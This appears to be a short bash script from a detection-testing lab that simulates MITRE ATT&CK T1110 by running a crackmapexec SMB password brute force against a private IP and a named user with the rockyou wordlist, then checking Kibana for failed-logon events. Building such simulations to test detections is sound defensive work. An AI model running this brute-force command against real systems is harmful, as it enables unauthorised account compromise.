#!/bin/bash
# Attack Simulation: Brute Force
# MITRE ATT&CK: T1110
# Usage: ./brute_force.sh
# Requirements: crackmapexec installed on Kali

TARGET_IP="192.168.50.86"
USERNAME="jsmith"
WORDLIST="/usr/share/wordlists/rockyou.txt"

echo "[*] Executing brute force attack against $TARGET_IP"
crackmapexec smb $TARGET_IP -u $USERNAME -p $WORDLIST

echo "[*] Attack complete - check Kibana for Event ID 4625 count > 5 in 5 minutes"
